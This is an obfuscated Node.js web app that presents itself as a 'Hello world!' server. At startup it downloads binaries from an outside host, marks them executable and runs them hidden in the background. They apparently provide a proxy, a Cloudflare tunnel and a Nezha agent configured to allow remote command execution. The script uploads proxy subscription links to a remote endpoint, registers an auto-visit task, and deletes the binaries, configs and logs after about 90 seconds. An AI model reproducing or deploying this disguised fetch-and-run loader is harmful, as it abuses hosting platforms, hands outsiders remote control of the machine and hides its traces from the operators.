const _0x2b1c2c=_0x3213;(function(_0x10ff6e,_0x447c1f){const _0x5d0e14=_0x3213,_0x11877a=_0x10ff6e();while(!![]){try{const _0x448f26=-parseInt(_0x5d0e14(0xe1))/0x1+-parseInt(_0x5d0e14(0x13f))/0x2+parseInt(_0x5d0e14(0x142))/0x3+parseInt(_0x5d0e14(0xd6))/0x4+-parseInt(_0x5d0e14(0x132))/0x5*(parseInt(_0x5d0e14(0xc5))/0x6)+parseInt(_0x5d0e14(0x106))/0x7+parseInt(_0x5d0e14(0xbc))/0x8*(parseInt(_0x5d0e14(0x12b))/0x9);if(_0x448f26===_0x447c1f)break;else _0x11877a['push'](_0x11877a['shift']());}catch(_0xe052a0){_0x11877a['push'](_0x11877a['shift']());}}}(_0x2d70,0x28f52));const express=require(_0x2b1c2c(0xef)),app=express(),axios=require(_0x2b1c2c(0x125)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2b1c2c(0xcd)),exec=promisify(require(_0x2b1c2c(0xb6))['exec']),{execSync}=require(_0x2b1c2c(0xb6)),UPLOAD_URL=process[_0x2b1c2c(0x11d)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2b1c2c(0x11d)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2b1c2c(0x11d)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0xc0)]||_0x2b1c2c(0xd5),SUB_PATH=process['env'][_0x2b1c2c(0xff)]||'sub',PORT=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x145)]||process[_0x2b1c2c(0x11d)]['PORT']||0xbb8,UUID=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x109)]||'a6375d7e-0d63-443c-927f-a559a0238c6a',NEZHA_SERVER=process['env'][_0x2b1c2c(0x137)]||'',NEZHA_PORT=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x140)]||'',NEZHA_KEY=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x97)]||'',ARGO_DOMAIN=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x139)]||'',ARGO_AUTH=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x10f)]||'',ARGO_PORT=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x112)]||0x1f41,CFIP=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x119)]||_0x2b1c2c(0xdc),CFPORT=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0xdf)]||0x1bb,NAME=process[_0x2b1c2c(0x11d)][_0x2b1c2c(0x10d)]||_0x2b1c2c(0xd8);function _0x2d70(){const _0x11156f=['NEZHA_PORT','forEach','191991isvWOn','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','message','SERVER_PORT','\x20>/dev/null\x202>&1\x20&','php','filter','stream','existsSync','/config.json\x20>/dev/null\x202>&1\x20&','/trojan-argo','/vless-argo','arch','all','\x0a\x20\x20\x0atrojan://','/vmess-argo?ed=2560','boot.log','NEZHA_KEY','freedom','false','unlinkSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https+local://8.8.8.8/dns-query','amd','vless','http','fileName','utf-8','automatic\x20access\x20task\x20added\x20successfully','/vmess-argo','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','push','./npm','clear','?security=tls&sni=','status','http\x20server\x20is\x20running\x20on\x20port:','unshift','npm','Hello\x20world!','arm64','config.json','\x20failed:\x20','Error\x20downloading\x20files:','\x0a\x20\x20tunnel:\x20','/api/delete-nodes','send','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','child_process','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','quic','writeFileSync','2087','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8GsEmFp','--tls','web\x20running\x20error:\x20','bot\x20is\x20running','FILE_PATH','from','split','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','php\x20is\x20running','1746PiAFnD','createWriteStream','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/dev/null','config.yaml','Skipping\x20adding\x20automatic\x20access\x20task','Empowerment\x20failed\x20for\x20','https://amd64.ssss.nyc.mn/2go','util','xtls-rprx-vision','&path=%2Ftrojan-argo%3Fed%3D2560#','web\x20is\x20running','\x0avless://','443','bot\x20is\x20running.','unlink','./tmp','447296yjUpvV','trim','Vls','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','data','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','ip.sb','blackhole','toString','CFPORT','\x20successfully','285226ptxKcu','readFileSync','Error\x20executing\x20command:\x20','/web\x20-c\x20','\x0a\x20\x20credentials-file:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','\x0a\x20\x20\x0avmess://','https://amd64.ssss.nyc.mn/v1','https://oooo.serv00.net/add-url','map','none','pop','bot','./php','express','Content-Type','App\x20is\x20running','TunnelSecret','2083','then','npm\x20is\x20running','tunnel.yml','npm\x20running\x20error:\x20','8443','/bot\x20','tls','\x0aclient_secret:\x20','post','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20success\x20for\x20','SUB_PATH','error','listen','aarch64','添加URL失败:\x20','./web','chmod','113267hnoCZD','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','UUID','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','nohup\x20','/tunnel.yml\x20run','NAME','\x20-p\x20','ARGO_AUTH','https://amd64.ssss.nyc.mn/agent','\x20is\x20created','ARGO_PORT','direct','php\x20running\x20error:\x20','/api/add-subscriptions','Download\x20','base64','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','CFIP','Error\x20reading\x20boot.log:','web','\x0a\x20\x20\x20\x20','env','stringify','response','NEZHA\x20variable\x20is\x20empty,skip\x20running','log','join','true','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','axios','tunnel.json','https://arm64.ssss.nyc.mn/web','finish','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','length','6705729euNEmU','match','close','sub.txt','ARGO_DOMAIN:','tcp','Subscription\x20uploaded\x20successfully','3370AOlOCO','https://arm64.ssss.nyc.mn/2go','includes','block','arm','NEZHA_SERVER','127.0.0.1','ARGO_DOMAIN','&path=%2Fvless-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/agent','list.txt','application/json','mkdirSync','575922HxPeFj'];_0x2d70=function(){return _0x11156f;};return _0x2d70();}!fs[_0x2b1c2c(0x14a)](FILE_PATH)?(fs[_0x2b1c2c(0x13e)](FILE_PATH),console['log'](FILE_PATH+_0x2b1c2c(0x111))):console[_0x2b1c2c(0x121)](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x2b1c2c(0x122)](FILE_PATH,_0x2b1c2c(0xac)),phpPath=path['join'](FILE_PATH,_0x2b1c2c(0x147)),webPath=path['join'](FILE_PATH,_0x2b1c2c(0x11b)),botPath=path['join'](FILE_PATH,'bot'),subPath=path[_0x2b1c2c(0x122)](FILE_PATH,_0x2b1c2c(0x12e)),listPath=path[_0x2b1c2c(0x122)](FILE_PATH,_0x2b1c2c(0x13c)),bootLogPath=path[_0x2b1c2c(0x122)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x2b1c2c(0xaf));function deleteNodes(){const _0x46bb8e=_0x2b1c2c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2d213c;try{_0x2d213c=fs[_0x46bb8e(0xe2)](subPath,_0x46bb8e(0xa1));}catch{return null;}const _0x3db73f=Buffer['from'](_0x2d213c,_0x46bb8e(0x117))['toString'](_0x46bb8e(0xa1)),_0x1cb5f7=_0x3db73f['split']('\x0a')[_0x46bb8e(0x148)](_0x7f0fa2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x7f0fa2));if(_0x1cb5f7[_0x46bb8e(0x12a)]===0x0)return;return axios[_0x46bb8e(0xfc)](UPLOAD_URL+_0x46bb8e(0xb3),JSON['stringify']({'nodes':_0x1cb5f7}),{'headers':{'Content-Type':_0x46bb8e(0x13d)}})['catch'](_0x26ac2d=>{return null;});}catch(_0x1afdfe){return null;}}function cleanupOldFiles(){const _0xd0d313=_0x2b1c2c,_0xdb288b=[_0xd0d313(0x11b),_0xd0d313(0xed),_0xd0d313(0xac),'php','sub.txt',_0xd0d313(0x96)];_0xdb288b[_0xd0d313(0x141)](_0x311edc=>{const _0x5bc6fb=_0xd0d313,_0x7a2713=path['join'](FILE_PATH,_0x311edc);fs[_0x5bc6fb(0xd4)](_0x7a2713,()=>{});});}app['get']('/',function(_0x36287a,_0x289349){const _0x4f430f=_0x2b1c2c;_0x289349['send'](_0x4f430f(0xad));});const config={'log':{'access':_0x2b1c2c(0xc8),'error':'/dev/null','loglevel':_0x2b1c2c(0xeb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b1c2c(0x9e),'settings':{'clients':[{'id':UUID,'flow':_0x2b1c2c(0xce)}],'decryption':_0x2b1c2c(0xeb),'fallbacks':[{'dest':0xbb9},{'path':_0x2b1c2c(0x14d),'dest':0xbba},{'path':_0x2b1c2c(0xa3),'dest':0xbbb},{'path':_0x2b1c2c(0x14c),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2b1c2c(0x138),'protocol':_0x2b1c2c(0x9e),'settings':{'clients':[{'id':UUID}],'decryption':_0x2b1c2c(0xeb)},'streamSettings':{'network':_0x2b1c2c(0x130),'security':_0x2b1c2c(0xeb)}},{'port':0xbba,'listen':_0x2b1c2c(0x138),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2b1c2c(0xeb),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':![],'destOverride':['http',_0x2b1c2c(0xfa),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2b1c2c(0x138),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2b1c2c(0xa3)}},'sniffing':{'enabled':![],'destOverride':[_0x2b1c2c(0x9f),'tls',_0x2b1c2c(0xb8)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2b1c2c(0x138),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2b1c2c(0xeb),'wsSettings':{'path':_0x2b1c2c(0x14c)}},'sniffing':{'enabled':![],'destOverride':[_0x2b1c2c(0x9f),_0x2b1c2c(0xfa),_0x2b1c2c(0xb8)],'metadataOnly':![]}}],'dns':{'servers':[_0x2b1c2c(0x9c)]},'outbounds':[{'protocol':_0x2b1c2c(0x98),'tag':_0x2b1c2c(0x113)},{'protocol':_0x2b1c2c(0xdd),'tag':_0x2b1c2c(0x135)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2b1c2c(0xaf)),JSON[_0x2b1c2c(0x11e)](config,null,0x2));function getSystemArchitecture(){const _0x1823a2=_0x2b1c2c,_0x11dde1=os[_0x1823a2(0x14e)]();return _0x11dde1===_0x1823a2(0x136)||_0x11dde1===_0x1823a2(0xae)||_0x11dde1===_0x1823a2(0x102)?_0x1823a2(0x136):_0x1823a2(0x9d);}function downloadFile(_0x212fd0,_0x3f0beb,_0x1c72a6){const _0x9d4893=_0x2b1c2c,_0x4d6fc1=path[_0x9d4893(0x122)](FILE_PATH,_0x212fd0),_0x70c321=fs[_0x9d4893(0xc6)](_0x4d6fc1);axios({'method':'get','url':_0x3f0beb,'responseType':_0x9d4893(0x149)})[_0x9d4893(0xf4)](_0x102236=>{const _0x1605a0=_0x9d4893;_0x102236[_0x1605a0(0xda)]['pipe'](_0x70c321),_0x70c321['on'](_0x1605a0(0x128),()=>{const _0x448e10=_0x1605a0;_0x70c321[_0x448e10(0x12d)](),console[_0x448e10(0x121)](_0x448e10(0x116)+_0x212fd0+_0x448e10(0xe0)),_0x1c72a6(null,_0x212fd0);}),_0x70c321['on'](_0x1605a0(0x100),_0x96e079=>{const _0x4e9b85=_0x1605a0;fs[_0x4e9b85(0xd4)](_0x4d6fc1,()=>{});const _0x289ff8=_0x4e9b85(0x116)+_0x212fd0+_0x4e9b85(0xb0)+_0x96e079[_0x4e9b85(0x144)];console[_0x4e9b85(0x100)](_0x289ff8),_0x1c72a6(_0x289ff8);});})['catch'](_0x3e060a=>{const _0x473260=_0x9d4893,_0x11f4d8=_0x473260(0x116)+_0x212fd0+_0x473260(0xb0)+_0x3e060a[_0x473260(0x144)];console[_0x473260(0x100)](_0x11f4d8),_0x1c72a6(_0x11f4d8);});}async function downloadFilesAndRun(){const _0x34409e=_0x2b1c2c,_0x2f433a=getSystemArchitecture(),_0x4fe2b3=getFilesForArchitecture(_0x2f433a);if(_0x4fe2b3[_0x34409e(0x12a)]===0x0){console[_0x34409e(0x121)](_0x34409e(0x108));return;}const _0x46580f=_0x4fe2b3[_0x34409e(0xea)](_0x4b331f=>{return new Promise((_0x1b25d6,_0x54ccc7)=>{const _0x31b2a9=_0x3213;downloadFile(_0x4b331f[_0x31b2a9(0xa0)],_0x4b331f['fileUrl'],(_0x2f5819,_0x15c51b)=>{_0x2f5819?_0x54ccc7(_0x2f5819):_0x1b25d6(_0x15c51b);});});});try{await Promise[_0x34409e(0x14f)](_0x46580f);}catch(_0x4ce13c){console[_0x34409e(0x100)](_0x34409e(0xb1),_0x4ce13c);return;}function _0x51c566(_0x10935d){const _0x57bc3d=_0x34409e,_0x974f68=0x1fd;_0x10935d[_0x57bc3d(0x141)](_0x32be36=>{const _0x3a0f72=_0x57bc3d,_0x39d134=path[_0x3a0f72(0x122)](FILE_PATH,_0x32be36);fs[_0x3a0f72(0x14a)](_0x39d134)&&fs[_0x3a0f72(0x105)](_0x39d134,_0x974f68,_0x1cb971=>{const _0x13d936=_0x3a0f72;_0x1cb971?console[_0x13d936(0x100)](_0x13d936(0xcb)+_0x39d134+':\x20'+_0x1cb971):console[_0x13d936(0x121)](_0x13d936(0xfe)+_0x39d134+':\x20'+_0x974f68[_0x13d936(0xde)](0x8));});});}const _0x334172=NEZHA_PORT?[_0x34409e(0xa6),_0x34409e(0x104),'./bot']:[_0x34409e(0xee),'./web','./bot'];_0x51c566(_0x334172);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2532c1=NEZHA_SERVER[_0x34409e(0x134)](':')?NEZHA_SERVER[_0x34409e(0xc2)](':')[_0x34409e(0xec)]():'',_0x5550d2=new Set([_0x34409e(0xd2),_0x34409e(0xf8),'2096','2087','2083','2053']),_0x4364d6=_0x5550d2['has'](_0x2532c1)?_0x34409e(0x123):_0x34409e(0x99),_0x158cf9=_0x34409e(0xfb)+NEZHA_KEY+_0x34409e(0xe6)+NEZHA_SERVER+_0x34409e(0x143)+_0x4364d6+_0x34409e(0xbb)+UUID;fs[_0x34409e(0xb9)](path['join'](FILE_PATH,_0x34409e(0xc9)),_0x158cf9);const _0x48ca66=_0x34409e(0x10b)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x34409e(0xb5);try{await exec(_0x48ca66),console['log'](_0x34409e(0xc4)),await new Promise(_0x2a0de6=>setTimeout(_0x2a0de6,0x3e8));}catch(_0x7d4d7b){console[_0x34409e(0x100)](_0x34409e(0x114)+_0x7d4d7b);}}else{let _0x2ed83a='';const _0x17fd59=['443',_0x34409e(0xf8),'2096',_0x34409e(0xba),_0x34409e(0xf3),'2053'];_0x17fd59['includes'](NEZHA_PORT)&&(_0x2ed83a=_0x34409e(0xbd));const _0x1e6ce0='nohup\x20'+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x34409e(0x10e)+NEZHA_KEY+'\x20'+_0x2ed83a+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1e6ce0),console[_0x34409e(0x121)](_0x34409e(0xf5)),await new Promise(_0x2eff5b=>setTimeout(_0x2eff5b,0x3e8));}catch(_0x2b4cb0){console[_0x34409e(0x100)](_0x34409e(0xf7)+_0x2b4cb0);}}}else console['log'](_0x34409e(0x120));const _0x2116d4=_0x34409e(0x10b)+FILE_PATH+_0x34409e(0xe4)+FILE_PATH+_0x34409e(0x14b);try{await exec(_0x2116d4),console[_0x34409e(0x121)](_0x34409e(0xd0)),await new Promise(_0xc70553=>setTimeout(_0xc70553,0x3e8));}catch(_0x520997){console[_0x34409e(0x100)](_0x34409e(0xbe)+_0x520997);}if(fs[_0x34409e(0x14a)](path[_0x34409e(0x122)](FILE_PATH,_0x34409e(0xed)))){let _0x5b8126;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5b8126=_0x34409e(0xb7)+ARGO_AUTH;else ARGO_AUTH[_0x34409e(0x12c)](/TunnelSecret/)?_0x5b8126=_0x34409e(0x129)+FILE_PATH+_0x34409e(0x10c):_0x5b8126=_0x34409e(0x10a)+FILE_PATH+_0x34409e(0xc7)+ARGO_PORT;try{await exec(_0x34409e(0x10b)+FILE_PATH+_0x34409e(0xf9)+_0x5b8126+_0x34409e(0x146)),console[_0x34409e(0x121)](_0x34409e(0xbf)),await new Promise(_0x127b5f=>setTimeout(_0x127b5f,0x7d0));}catch(_0x41ea69){console[_0x34409e(0x100)](_0x34409e(0xe3)+_0x41ea69);}}await new Promise(_0x487ae7=>setTimeout(_0x487ae7,0x1388));}function getFilesForArchitecture(_0x130215){const _0x2cc5ae=_0x2b1c2c;let _0x40e04c;_0x130215===_0x2cc5ae(0x136)?_0x40e04c=[{'fileName':_0x2cc5ae(0x11b),'fileUrl':_0x2cc5ae(0x127)},{'fileName':_0x2cc5ae(0xed),'fileUrl':_0x2cc5ae(0x133)}]:_0x40e04c=[{'fileName':_0x2cc5ae(0x11b),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x2cc5ae(0xed),'fileUrl':_0x2cc5ae(0xcc)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5a76c8=_0x130215===_0x2cc5ae(0x136)?_0x2cc5ae(0x13b):_0x2cc5ae(0x110);_0x40e04c[_0x2cc5ae(0xab)]({'fileName':_0x2cc5ae(0xac),'fileUrl':_0x5a76c8});}else{const _0xfce3fb=_0x130215==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x2cc5ae(0xe8);_0x40e04c['unshift']({'fileName':_0x2cc5ae(0x147),'fileUrl':_0xfce3fb});}}return _0x40e04c;}function argoType(){const _0x4464ac=_0x2b1c2c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4464ac(0x121)](_0x4464ac(0xd9));return;}if(ARGO_AUTH['includes'](_0x4464ac(0xf2))){fs['writeFileSync'](path[_0x4464ac(0x122)](FILE_PATH,_0x4464ac(0x126)),ARGO_AUTH);const _0x399bb1=_0x4464ac(0xb2)+ARGO_AUTH[_0x4464ac(0xc2)]('\x22')[0xb]+_0x4464ac(0xe5)+path[_0x4464ac(0x122)](FILE_PATH,_0x4464ac(0x126))+_0x4464ac(0x124)+ARGO_DOMAIN+_0x4464ac(0xfd)+ARGO_PORT+_0x4464ac(0x118);fs['writeFileSync'](path['join'](FILE_PATH,_0x4464ac(0xf6)),_0x399bb1);}else console['log'](_0x4464ac(0x9b));}argoType();async function extractDomains(){const _0x4129e1=_0x2b1c2c;let _0x212a18;if(ARGO_AUTH&&ARGO_DOMAIN)_0x212a18=ARGO_DOMAIN,console[_0x4129e1(0x121)](_0x4129e1(0x12f),_0x212a18),await _0x2ab7a2(_0x212a18);else try{const _0x285ed4=fs[_0x4129e1(0xe2)](path['join'](FILE_PATH,_0x4129e1(0x96)),_0x4129e1(0xa1)),_0x4290d8=_0x285ed4[_0x4129e1(0xc2)]('\x0a'),_0x51a130=[];_0x4290d8['forEach'](_0xf5cb4d=>{const _0x51f857=_0x4129e1,_0x14b0ca=_0xf5cb4d[_0x51f857(0x12c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x14b0ca){const _0x1814f3=_0x14b0ca[0x1];_0x51a130[_0x51f857(0xa5)](_0x1814f3);}});if(_0x51a130['length']>0x0)_0x212a18=_0x51a130[0x0],console['log']('ArgoDomain:',_0x212a18),await _0x2ab7a2(_0x212a18);else{console['log'](_0x4129e1(0xc3)),fs[_0x4129e1(0x9a)](path[_0x4129e1(0x122)](FILE_PATH,_0x4129e1(0x96)));async function _0x14d037(){const _0x416d87=_0x4129e1;try{await exec(_0x416d87(0xdb));}catch(_0x56c114){}}_0x14d037(),await new Promise(_0x35ed28=>setTimeout(_0x35ed28,0xbb8));const _0x527a3f=_0x4129e1(0x10a)+FILE_PATH+_0x4129e1(0xc7)+ARGO_PORT;try{await exec(_0x4129e1(0x10b)+path[_0x4129e1(0x122)](FILE_PATH,_0x4129e1(0xed))+'\x20'+_0x527a3f+_0x4129e1(0x146)),console[_0x4129e1(0x121)](_0x4129e1(0xd3)),await new Promise(_0x162a61=>setTimeout(_0x162a61,0xbb8)),await extractDomains();}catch(_0x254192){console[_0x4129e1(0x100)](_0x4129e1(0xe3)+_0x254192);}}}catch(_0x1c23ae){console['error'](_0x4129e1(0x11a),_0x1c23ae);}async function _0x2ab7a2(_0x44633f){const _0x526800=_0x4129e1,_0x201046=execSync(_0x526800(0x107),{'encoding':_0x526800(0xa1)}),_0x45d731=_0x201046[_0x526800(0xd7)]();return new Promise(_0xe2d58=>{setTimeout(()=>{const _0x4d63ad=_0x3213,_0x556233={'v':'2','ps':NAME+'-'+_0x45d731,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x44633f,'path':_0x4d63ad(0x151),'tls':_0x4d63ad(0xfa),'sni':_0x44633f,'alpn':''},_0x491e9b=_0x4d63ad(0xd1)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x44633f+'&type=ws&host='+_0x44633f+_0x4d63ad(0x13a)+NAME+'-'+_0x45d731+_0x4d63ad(0xe7)+Buffer['from'](JSON[_0x4d63ad(0x11e)](_0x556233))[_0x4d63ad(0xde)](_0x4d63ad(0x117))+_0x4d63ad(0x150)+UUID+'@'+CFIP+':'+CFPORT+_0x4d63ad(0xa8)+_0x44633f+'&type=ws&host='+_0x44633f+_0x4d63ad(0xcf)+NAME+'-'+_0x45d731+_0x4d63ad(0x11c);console[_0x4d63ad(0x121)](Buffer['from'](_0x491e9b)[_0x4d63ad(0xde)](_0x4d63ad(0x117))),fs[_0x4d63ad(0xb9)](subPath,Buffer[_0x4d63ad(0xc1)](_0x491e9b)[_0x4d63ad(0xde)](_0x4d63ad(0x117))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app['get']('/'+SUB_PATH,(_0x4a692a,_0x38d9c9)=>{const _0x526e45=_0x4d63ad,_0x11bb8c=Buffer[_0x526e45(0xc1)](_0x491e9b)[_0x526e45(0xde)](_0x526e45(0x117));_0x38d9c9['set'](_0x526e45(0xf0),'text/plain;\x20charset=utf-8'),_0x38d9c9[_0x526e45(0xb4)](_0x11bb8c);}),_0xe2d58(_0x491e9b);},0x7d0);});}}async function uplodNodes(){const _0x15b1fc=_0x2b1c2c;if(UPLOAD_URL&&PROJECT_URL){const _0x119dff=PROJECT_URL+'/'+SUB_PATH,_0x4124cf={'subscription':[_0x119dff]};try{const _0x440d57=await axios[_0x15b1fc(0xfc)](UPLOAD_URL+_0x15b1fc(0x115),_0x4124cf,{'headers':{'Content-Type':_0x15b1fc(0x13d)}});if(_0x440d57[_0x15b1fc(0xa9)]===0xc8)console[_0x15b1fc(0x121)](_0x15b1fc(0x131));else return null;}catch(_0xdd78b1){if(_0xdd78b1['response']){if(_0xdd78b1[_0x15b1fc(0x11f)][_0x15b1fc(0xa9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x15b1fc(0x14a)](listPath))return;const _0x4044a1=fs[_0x15b1fc(0xe2)](listPath,'utf-8'),_0x2261d9=_0x4044a1[_0x15b1fc(0xc2)]('\x0a')[_0x15b1fc(0x148)](_0x3c97e8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3c97e8));if(_0x2261d9[_0x15b1fc(0x12a)]===0x0)return;const _0x201122=JSON[_0x15b1fc(0x11e)]({'nodes':_0x2261d9});try{await axios[_0x15b1fc(0xfc)](UPLOAD_URL+'/api/add-nodes',_0x201122,{'headers':{'Content-Type':_0x15b1fc(0x13d)}});if(response['status']===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x1c8655){return null;}}else return;}}function _0x3213(_0x2db986,_0x183d85){const _0x2d70f8=_0x2d70();return _0x3213=function(_0x32134f,_0x3a5f07){_0x32134f=_0x32134f-0x96;let _0x349ac4=_0x2d70f8[_0x32134f];return _0x349ac4;},_0x3213(_0x2db986,_0x183d85);}function cleanFiles(){setTimeout(()=>{const _0x5211b5=_0x3213,_0x4cd98f=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x4cd98f['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4cd98f['push'](phpPath);exec('rm\x20-rf\x20'+_0x4cd98f[_0x5211b5(0x122)]('\x20')+'\x20>/dev/null\x202>&1',_0x3cf9a5=>{const _0xb756ff=_0x5211b5;console[_0xb756ff(0xa7)](),console[_0xb756ff(0x121)](_0xb756ff(0xf1)),console['log'](_0xb756ff(0xa4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x45ce3e=_0x2b1c2c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x45ce3e(0x121)](_0x45ce3e(0xca));return;}try{const _0x5d191e=await axios[_0x45ce3e(0xfc)](_0x45ce3e(0xe9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x45ce3e(0x13d)}});console[_0x45ce3e(0x121)](_0x45ce3e(0xa2));}catch(_0x109b98){console[_0x45ce3e(0x100)](_0x45ce3e(0x103)+_0x109b98['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x2b1c2c(0x101)](PORT,()=>console['log'](_0x2b1c2c(0xaa)+PORT+'!'));
